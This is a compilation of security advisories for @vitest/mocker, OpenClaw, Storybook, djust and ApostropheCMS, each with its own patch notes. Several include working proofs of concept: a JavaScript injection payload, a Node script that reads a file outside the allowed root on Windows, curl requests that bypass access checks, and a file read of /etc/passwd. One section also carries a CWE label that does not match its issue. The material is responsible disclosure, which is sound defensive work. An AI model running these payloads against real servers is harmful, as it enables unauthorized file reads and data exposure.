Same handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.

### Patches

Fixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.

Projects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.

### Details

`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:

```ts
export function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '"__vitest_mocker__"'): string {
  const source = `
const __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule("${moduleUrl}");
`
```

`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.

`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:

```ts
configureServer(server) {
  if (options.registerWebSocketEvents === false) { return }
  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {
    if (event.type === 'manual') {
      const module = ManualMockedModule.fromJSON(event, async () => {
        const keys = await getFactoryExports(event.url)
        return Object.fromEntries(keys.map(key => [key, null]))
      })
      registry.add(module)                       // no validation of `id` or `url`
    }
    else {
      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }
```

`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.

With `url = 'x"); globalThis.ARES_INJECTED = 1; void("'` a request for `/src/app.js` is answered with valid, executable JavaScript:

```js
const __factoryModule__ = await globalThis["__vitest_mocker__"].getFactoryModule("x"); globalThis.ARES_INJECTED = 1; void("");
```

`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__["X"]`, `export { __0 as "X" }` and `resolvedModule["X"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.

**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.

```
    const __factoryModule__ = await globalThis["__vitest_mocker__"].getFactoryModule("x"); globalThis.ARES_INJECTED = 1; void("");

    let __0 = __factoryModule__["a"]
    export { __0 as "a" }
    if (__factoryModule__.__factoryPromise != null) {
      __factoryModule__.__factoryPromise.then((resolvedModule) => {
        __0 = resolvedModule["a"];
      })
    }
PASS  attacker statement is present in the module the dev server serves
PASS  the real module body was replaced
PASS  the injected module parses as JavaScript (Vite import analysis accepted it)

RESULT: VULNERABLE
```

* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.
* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.
* **Precondition controls** — the two `Origin` probes record the boundary honestly.
* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with "content contains invalid JS syntax"), so acceptance proves the injected module is valid, executable JavaScript.

Reproduced three times from a clean `mktemp` fixture, exit 0 each time.

### Impact

Code injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.

### Credits

- Thai Son Dinh from VinSOC Labs (R&D)

Disclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.

## Summary

The path traversal fix released for [GHSA-82fw-gwwq-j7x9](https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9) can be bypassed on Windows by using a backslash in the redirect URL pathname.

The fixed code joins an attacker-controlled URL pathname with the Vite root using `node:path/posix`, then passes that string to Vite's file allowlist check. On Windows, a value such as `C:/project/root/..\secret.txt` retains `..\` during the POSIX join and begins with the allowed root, so the allowlist accepts it. The later `readFile()` call uses Windows filesystem semantics, where the backslash is a path separator, and reads the sibling file outside the configured root.

I reproduced the issue with the published `@vitest/mocker` packages in both fixed release lines:

- `@vitest/mocker@4.1.11`
- `@vitest/mocker@5.0.0`

The current `main` source at commit `2ce29d5fa758046e5453bd92b8ed6c9da9709bb5` has the same behavior.

## Patches

Fixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. The redirect registration now converts backslashes in the URL pathname to forward slashes before it joins the pathname with the root, so `..\` resolves the same as `../` and the allowlist check rejects it.

## Relationship to GHSA-82fw-gwwq-j7x9

This is a bypass of the accepted fix, not a separate unrelated path. It uses the same `vitest:interceptor:register` redirect registration and the same file-reading sink as the original advisory. A forward-slash traversal is rejected after the fix, while the equivalent Windows backslash traversal is accepted.

The original advisory marks 4.1.11 and 5.0.0-rc.2 as patched. The newly affected ranges introduced by the incomplete fix are therefore:

- `4.1.11`
- `>=5.0.0-rc.2, <5.0.3`

Older affected releases remain covered by GHSA-82fw-gwwq-j7x9.

## Root cause

`packages/mocker/src/node/interceptorPlugin.ts` imports `join` from `node:path/posix`. Redirect registration currently performs the equivalent of:

```ts
const redirect = join(server.config.root, redirectUrl.pathname)
if (!isFileLoadingAllowed(server.config, redirect)) return
event.redirect = redirect
```

The registered value later reaches:

```ts
readFile(mock.redirect, 'utf-8')
```

Vite's allowlist check expects a normalized absolute filesystem path. On Windows, POSIX joining does not normalize backslashes, but `readFile` interprets them as separators. The check and the sink therefore interpret the same string differently.

The authenticated browser RPC fallback in `packages/browser/src/node/rpc.ts` is not affected: it joins the path with `pathe`, which converts backslashes to forward slashes before the access check. The reproduction below targets the public mocker WebSocket registration path.

## Preconditions and impact

A client that can reach a Vite server using the public `mockerPlugin` or standalone `interceptorPlugin` WebSocket registration can register a redirect mock. On Windows, the client can then request the registered module and read a file outside `server.fs.allow` that the Vitest/Vite process account can access. Vitest Browser Mode does not register these WebSocket handlers in the affected versions.

The reproduction uses an unauthenticated Vite HMR WebSocket connection and a normal HTTP GET. It does not call the plugin's internal transform API. The practical network reachability is the same deployment precondition described by the original advisory; default loopback-only development servers are correspondingly less exposed.

## Reproduction

Tested on GitHub-hosted Windows Server 2025 with Node.js 22. The test creates only temporary synthetic files: a Vite root directory and a sibling `secret.txt` containing a canary.

Install dependencies for either affected line:

```console
npm install @vitest/mocker@4.1.11 vite@7.1.5 ws@8.18.3
# or
npm install @vitest/mocker@5.0.0 vite@7.1.5 ws@8.18.3
node poc.mjs
```

`poc.mjs`:

```js
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { randomUUID } from 'node:crypto'
import { interceptorPlugin } from '@vitest/mocker/node'
import { createServer } from 'vite'
import { WebSocket } from 'ws'

const base = join(tmpdir(), `vitest-path-${randomUUID()}`)
const root = join(base, 'root')
const secret = join(base, 'secret.txt')
await mkdir(root, { recursive: true })
await writeFile(secret, 'SYNTHETIC_OUTSIDE_ROOT_CANARY')

const server = await createServer({
  root,
  configFile: false,
  logLevel: 'silent',
  server: { fs: { allow: [root] } },
  plugins: [
    {
      name: 'validation:virtual-modules',
      enforce: 'pre',
      resolveId(id) {
        if (id === '/control' || id === '/bypass') return id
      },
    },
    interceptorPlugin(),
  ],
})

await server.listen()
const port = new URL(server.resolvedUrls.local[0]).port
const baseUrl = server.resolvedUrls.local[0]

function register(id, redirect) {
  return new Promise((resolve, reject) => {
    const socket = new WebSocket(`ws://localhost:${port}`, 'vite-hmr')
    const timer = setTimeout(() => reject(new Error('registration timeout')), 5000)
    socket.on('message', (raw) => {
      let message
      try { message = JSON.parse(raw.toString()) } catch { return }
      if (message.type === 'custom' && message.event === 'vitest:interceptor:register:result') {
        clearTimeout(timer)
        socket.close()
        resolve()
      }
    })
    socket.on('open', () => socket.send(JSON.stringify({
      type: 'custom',
      event: 'vitest:interceptor:register',
      data: { type: 'redirect', raw: '', id, url: id, redirect },
    })))
    socket.on('error', reject)
  })
}

try {
  await register('/control', 'traversal:../secret.txt')
  const controlResponse = await fetch(new URL('/control', baseUrl))
  const controlBody = await controlResponse.text()

  await register('/bypass', 'traversal:..\\secret.txt')
  const bypassResponse = await fetch(new URL('/bypass', baseUrl))
  const bypassBody = await bypassResponse.text()

  const result = {
    platform: process.platform,
    root,
    outsideFile: secret,
    slashTraversalStatus: controlResponse.status,
    slashTraversalRejected: !controlBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),
    backslashTraversalStatus: bypassResponse.status,
    backslashTraversalReturnedOutsideCanary: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),
    returnedBody: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY') ? 'SYNTHETIC_OUTSIDE_ROOT_CANARY' : null,
    expectedBackslashTraversalBlocked: process.env.EXPECT_BLOCKED === '1',
  }
  console.log(JSON.stringify(result, null, 2))
  const backslashResultMatchesExpectation = result.expectedBackslashTraversalBlocked
    ? !result.backslashTraversalReturnedOutsideCanary
    : result.backslashTraversalReturnedOutsideCanary
  if (!result.slashTraversalRejected || !backslashResultMatchesExpectation) process.exitCode = 1
} finally {
  await server.close()
}
```

Observed with `@vitest/mocker@4.1.11`:

```json
{
  "platform": "win32",
  "slashTraversalStatus": 404,
  "slashTraversalRejected": true,
  "backslashTraversalStatus": 200,
  "backslashTraversalReturnedOutsideCanary": true,
  "returnedBody": "SYNTHETIC_OUTSIDE_ROOT_CANARY",
  "expectedBackslashTraversalBlocked": false
}
```

The same result was observed with `@vitest/mocker@5.0.0`.

This includes two useful controls:

1. `traversal:../secret.txt` is rejected and returns 404, confirming the published forward-slash fix is active.
2. `traversal:..\secret.txt` returns 200 and the exact outside-root canary, confirming a Windows separator bypass rather than an unrelated route or fixture response.

### Summary

Browser CDP discovery could accept blocked WebSocket URLs. In affected versions, a lower-trust caller or configured input path could reach network destinations that should have been blocked by OpenClaw policy.

This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.

### Impact

When the affected feature is enabled and reachable, this could reach network destinations that should have been blocked by OpenClaw policy. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.

### Patched Versions

The first stable patched version is `2026.6.6`.

### Mitigations

Upgrade to a patched OpenClaw release when one is listed. Before upgrading, restrict the affected feature to trusted operators or disable it when it is not needed. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.

**Summary:** A malicious website may be able to cause unauthorized file changes in a developer’s project while an affected Storybook development server is running. Under additional conditions, a changed file could be executed by a local runtime with the developer’s privileges. We are not aware of exploitation in the wild.

## Who is impacted?

You are impacted if you run a Storybook dev server in the affected versions.

You are not impacted if:

- You run a dev server that you never open in a web browser (e.g. headless automation, MCP clients)
- You run or visit a built version of Storybook

Recent versions of Chrome and Firefox may ask for permission before a website can connect to a `localhost` service. This reduces the risk, but does not remove it. Do not grant this permission to websites you don’t trust.

## Recommended actions

### Upgrade Storybook

Storybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur. 

Upgrade to a patched version listed below before running `storybook dev` again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.

- 11.0.0-alpha.6
- 10.6.2
- 9.1.21
- 8.6.19

### Review potentially breaking changes

Due to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, we've added feature flags that can disable specific security updates to support your existing workflows.

Please carefully read the introduced flags and the consequences of using them.

#### Iframe embedding over the network is disabled by default

Storybook no longer allows the manager or preview to be embedded as an iframe on a website with a different host name. Built versions of Storybook are unaffected and can be freely embedded.

If you rely on embedding a Storybook dev server through a separate web app, run that separate app on `localhost`. You may also use the `security.insecureRemoteIframeEmbed` feature flag to re-enable iframe embedding from any origin.

#### The preview iframe rejects messages sent by an unknown host

Both the Storybook preview and manager now restrict the origin of iframes and parent windows that they can send messages to and receive messages from using the `postMessage` API.

By default, Storybook in dev mode only accepts communication with its own origin and other `localhost` services. Built Storybooks continue to accept communication from unknown origins.

A Storybook addon or integration could hypothetically rely on `postMessage` to update a live story's args. If you do that, reach out to the Storybook team to explore safer alternatives.

Storybook composition also relies on `postMessage`, so a composed Storybook on a different origin now fails to load unless it has been built. The `security.insecureIframeMessaging` feature flag disables this protection, but we recommend you build composed Storybooks instead.

#### The `highlight` event signature has changed

Storybook’s own accessibility addon uses the `highlight` event to inject highlights into the preview, which a user can click. Clicking the highlight opens a menu with a link to a documentation page.

The API for that event was too permissive and could be used to trigger arbitrary events, including events processed by the user’s dev server. We reworked the API to prevent abuse. Besides the accessibility addon, Chromatic's Visual Tests addon uses this API to link to documentation from highlighted ignored elements. Update the Visual Tests addon to version 5.5.1 or later to keep that link working. Because no other addons use this API as far as we know, we have not added a feature flag to restore the old API.

## Disclosure timeline

On September 30th, the Storybook team received a responsible disclosure showing how a malicious website can embed a Storybook dev server's preview iframe and send events to the dev server on the developer's machine.

They combined this information with findings from an ongoing security audit to come up with a worst-case-scenario exploitation of the disclosed vulnerability, and the ones we independently discovered. They then worked to address all layers necessary for this worst-case scenario to happen. We have not received evidence of exploitation in real Storybook projects. The attack outlined in this advisory relies on correctly exploiting a sequence of many vulnerabilities, some of which were never disclosed to the Storybook team.

### Worst-case attack scenario

An attacker-controlled website can interact with the preview of a running Storybook dev server. With user interaction, it may cause the dev server to make unauthorized changes to story files. If a malicious file is subsequently executed by a local runtime, the attack could lead to arbitrary code execution with the developer’s permissions.

### Affected version / file / line
Version: djust v1.1.4 (latest release, published 2026-09-23). File: python/djust/mcp/server.py:354-433 (MCP tool find_handlers_for_template). Confirmed identical on the commit used for triage, a7e4fafd1667b4db0b1465652d4a63cb17117a07.

### Description
```
@mcp.tool()
def find_handlers_for_template(template_path: str) -> str:
    """
    Args:
        template_path: Either a logical template name (e.g.
            'demos/counter.html' — what you'd pass to `render`) OR
            an absolute filesystem path. Both are searched.
    """
    ...
    resolved_path: str | None = None
    if os.path.isabs(template_path) and os.path.isfile(template_path):
        resolved_path = template_path
    else:
        ...  # logical-name resolution via Django's template loader
    ...
    with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
        source = f.read()
    handler_names_in_template = sorted({m.group(2) for m in dj_event_attr_re.finditer(source)})
```
When template_path is an absolute path to an existing file, it is used directly, with no confinement to the project/template directories — no realpath() + prefix check, no allowlist. open(resolved_path, ...) then reads the file.

This is inconsistent with the sibling tool in the same file (loaddata, ~line 290-303), which explicitly rejects paths outside the project directory for its own path-like parameter:
```
candidate = os.path.realpath(...)
if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
    return json.dumps({"error": f"fixture path '{p}' resolves outside the project directory", ...})
```
find_handlers_for_template has no equivalent check for template_path before the open() call.

### Impact
An MCP client with access to this tool (available whenever the Django project is running the MCP server via python manage.py djust_mcp — no separate opt-in flag gates this specific tool beyond that) can read the contents of any file on disk that the process has read permission to and that exists, by passing an absolute path — e.g. /etc/passwd, application .env files, SSH keys, or any other sensitive file reachable by the server process's user.

Mitigating factor (reduces this from High to Medium): the tool does not return the raw file content. It runs one fixed regex (dj-(?:click|submit|change|input|keydown|keyup)\s*=\s*['"]([^'"]+)['"]) against the content and returns only the matched handler-name strings, plus confirmation that the file exists and is readable (an existence/readability oracle on its own, independent of the regex match). If the targeted file happens to contain text matching that HTML-attribute-like pattern (plausible for config files, logs, or any text file with key="value"-shaped content), those substrings are returned in full — so the read is not purely blind, but it is not a general-purpose arbitrary-file-read primitive either.

Proof of Concept / Reproduction
Traced via direct source read; no live Django project was exercised for this report (would require a full djust project scaffold, which was out of scope for this pass — see limitation below).

1. MCP client calls: find_handlers_for_template(template_path="/etc/passwd")
2. server.py ~line 393:
    ```
       if os.path.isabs(template_path) and os.path.isfile(template_path):
           resolved_path = template_path
    ```
   resolved_path == "/etc/passwd", unchanged, unconfined
3. server.py ~line 430:
    ```
       with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
           source = f.read()
   ```
   /etc/passwd is now fully read into `source`
4. The regex dj_event_attr_re.finditer(source) is applied to the real
   /etc/passwd content. /etc/passwd will not match this specific pattern, so
   the response would report an empty handler list plus "file exists and was
   read" - which already confirms the path-confinement bypass (compare with
   passing a nonexistent absolute path, which correctly returns
   "Template file not found").
5. On a target where the absolute path points to a file that DOES contain
   text shaped like `dj-click="..."` (e.g. a copied HTML fragment, a stray
   config value, or a crafted file placed by the attacker via another
   vector), the matched substrings are returned verbatim in the JSON
   response - full-content disclosure of just those substrings, not the
   whole file.

### Suggested Fix
Apply the same confinement loaddata already uses, before the os.path.isfile check:
```
if os.path.isabs(template_path):
    candidate = os.path.realpath(template_path)
    if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
        return json.dumps({
            "error": f"template path '{template_path}' resolves outside the project directory",
            "resolved": candidate,
            "project_dir": str(base_dir),
        })
    if os.path.isfile(candidate):
        resolved_path = candidate
```
### Limitations
Not exercised against a live Django/djust project — this is a source-level trace of the exact executed branch (os.path.isabs + os.path.isfile + open()), not an end-to-end runtime capture.
Did not verify whether any MCP-host-level confirmation/approval step (some MCP clients prompt the user before a tool call with a suspicious-looking path argument) would intercept this in practice - the vulnerability is in the server's own missing server-side guard regardless of client-side UX.

### Disclosure Timeline
2026-09-24: found during  audit, confirmed via source trace to the open() sink; classified Medium due to the response-content limitation (matched substrings only, not raw file content).
Please check the log file, and apply CVE once the fix is made.


## Maintainer assessment
The djust MCP server (`manage.py djust_mcp`, `python -m djust.mcp`) only serves stdio to the MCP client that launched it, as the same OS user, on the developer's machine; there is no network listener. The realistic caller is a local AI agent acting on untrusted input. The tool returns only `dj-*`-attribute-shaped substrings and an existence answer, not file contents. We therefore rate this Low (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N, 3.3).

Affected: every release with the tool, 0.9.0 – 1.0.9, 1.1.0 – 1.1.6, 1.2.0 – 1.2.3, 1.3.0rc4 – 1.3.0rc7.

### Summary
The `slugTaken` endpoint returns a boolean indicating whether a slug is in use across
all document types and visibility levels, with no permission or type filter. Any logged-in
user (including editors) can enumerate the slug space of private pages, drafts, and
archived content.

### Details
`POST /api/v1/@apostrophecms/doc/slugTaken` with body `{ "slug": "target-slug" }` runs
a raw existence check against the documents collection. It does not:
- Check whether the requesting user has read permission for documents of that type.
- Filter by `visibility` (public, loginRequired, private).
- Filter by `viewRole`.
- Filter by publication status (draft vs published).

A single authenticated session can iterate the slug space to enumerate the full content
inventory of the CMS, including content the user is explicitly prohibited from viewing.

### PoC
```bash
# Any authenticated session works — editor role sufficient
curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"known-private-page-slug"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": true }  — confirms private page exists

curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"zzz-nonexistent"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": false }
```

### Impact
Information disclosure. An attacker with any authenticated session can enumerate all
slugs in the system, mapping the full content structure of the CMS including private and
admin-only content.

### Summary
The `getOne` REST endpoint for pages does not apply `viewRole` type-level restrictions
or `viewPermission` field-level redaction. An editor-level user who knows a document
`_id` can read the full content of admin-only pages and their privileged fields, while
the `getAll` endpoint correctly enforces both restrictions.

### Details
**Finding 3 — viewRole bypass:**
`modules/@apostrophecms/page/index.js` exposes `getRestQuery(req, omitPermissionCheck =
false)`. The `getAll` path calls `publicApiCheckAsync` and threads the full query builder
pipeline including `viewRole` filtering. The `getOne` path uses a divergent code path
that skips this pipeline.

A page type declared with `viewRole: 'admin'` is inaccessible via `GET
/api/v1/@apostrophecms/page?type=secretPage` (returns 403 to an editor) but is fully
returned by `GET /api/v1/@apostrophecms/page/:id:en:published` to the same editor.

**Finding 4 — viewPermission field leak:**
Fields decorated with `viewPermission: { action: 'edit', type: '@apostrophecms/page' }`
are stripped by `removeForbiddenFields` in the `getAll` path but are returned verbatim
in `getOne`. An editor who knows any document `_id` can read all
`viewPermission`-restricted fields.

### PoC
```bash
# Log in as editor, get session jar
EDITOR_JAR="..."

# getAll — correctly blocked
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page?type=secretPage"
# → 403 Forbidden

# getOne — bypassed, returns full document including viewPermission fields
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page/ADMIN_PAGE_ID:en:published"
# → 200 OK, full doc including secretField value
```

### Impact
Editors can read the full content of any page — including those restricted to admins via
`viewRole` — if they know or can guess the `_id`. Sensitive field values gated by
`viewPermission` are also fully exposed. This breaks the content access control model
for any site using these decorators.

cwe.name: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

cves.summary:
### Summary
ApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:

- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and
- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.

This is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.

### Details
For an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:

```js
const query = self.find(req).attachments(true);
query.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string
...
query.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection
query.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate
```

`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.

**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.

**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.

Neither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.

### PoC
**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.

Test type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):

```js
export default {
  extend: '@apostrophecms/piece-type',
  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },
  fields: { add: {
    secret:     { type: 'integer' },
    secretNote: { type: 'string' }   // searchable by default; NOT in the projection
  } }
};
```

Five articles were inserted and published via the authenticated REST API:
`A.secret=50, secretNote="zzsecretalpha"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.
The insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `"highSearchText": "... zzsecretalpha"`, `"lowSearchText": "... zzsecretalpha"`.

Anonymous requests (no credentials, no session):

```bash
# [1] Baseline: projection hides secret/secretNote on direct read
curl -s 'http://localhost:3000/api/v1/article?perPage=1'

# [2] Search oracle: value exists ONLY in hidden secretNote
curl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'
curl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'

# [3] Sort oracle: order by hidden integer field
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'

# Negative control: projection override is blocked
curl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'
```

Results (verified on ApostropheCMS 4.32.2, MongoDB 7.0):

| Request (anonymous)       | Observed                                          | Verdict                               |
| ------------------------- | ------------------------------------------------- | ------------------------------------- |
| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |
| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |
| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |
| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |
| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |
| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |

### Impact
Unauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:

- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.
- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.

No authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).

### Remediation
Gate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:

- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.
- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.
